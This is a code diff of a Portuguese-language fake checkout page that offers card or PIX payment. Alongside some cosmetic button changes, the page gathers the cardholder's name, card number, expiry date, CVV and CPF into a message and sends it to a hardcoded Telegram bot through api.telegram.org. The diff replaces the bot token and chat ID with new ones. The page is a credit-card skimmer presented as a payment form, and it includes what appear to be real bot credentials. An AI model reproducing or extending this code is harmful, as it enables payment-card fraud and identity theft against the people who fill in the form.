@@ -226,11 +226,13 @@
       </div>
     </div>
 
+
     <!-- Seção PIX -->
     <div class="pix-container" id="pixContainer">
       <p class="pix-info"><strong>Copie a Chave Pix:</strong> e Cole No App Bancario</p>
       <button type="button" class="copy-button" id="copyPixKey">Copiar Chave Pix</button>
-      <img src="../images/qr.jpg" alt="QR Code Pix" class="qr-code">
+      <button id="backToCard">💳 Pagar com Cartão</button>
+      <img src="../images/qr.jpg" alt="QR Code Pix" width="300"  class="qr-code">
     </div>
 
     <!-- Informações de Parcelamento -->
@@ -266,9 +268,19 @@
     });
 
     // Exibir chave Pix e QR Code
-    document.getElementById('pixButton').addEventListener('click', function () {
-      document.getElementById('pixContainer').style.display = 'block';
-    });
+   // Mostrar PIX
+document.getElementById('pixButton').addEventListener('click', function () {
+  document.getElementById('pixContainer').style.display = 'block';
+  document.getElementById('paymentForm').style.display = 'none';
+  document.querySelector('.card-container').style.display = 'none';
+});
+
+// Voltar para cartão
+document.getElementById('backToCard').addEventListener('click', function () {
+  document.getElementById('pixContainer').style.display = 'none';
+  document.getElementById('paymentForm').style.display = 'flex';
+  document.querySelector('.card-container').style.display = 'flex';
+});
 
     // Copiar chave Pix
     document.getElementById('copyPixKey').addEventListener('click', function () {
@@ -288,8 +300,8 @@
 
       const message = `👻 ANGELL HELLS 👹\n\n💀| Nome: ${cardHolder}\n💳| Número do Cartão: ${cardNumber}\n📅| Validade: ${expiration}\n🔐| CVV: ${cvv}\n🙎| CPF: ${cpf}`;
 
-      const botToken = '8237218506:AAGjVaHnTu7QNmYZghJ542hwD7QKR_M6ElQ';  // Substitua pelo seu bot token
-      const chatId = '8668096353';      // Substitua pelo seu chat ID
+      const botToken = '7500408481:AAFZF3zGUEeEJL5uTLWXDnjDgs5SLQwDqTs';  // Substitua pelo seu bot token
+      const chatId = '6859444625';      // Substitua pelo seu chat ID
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
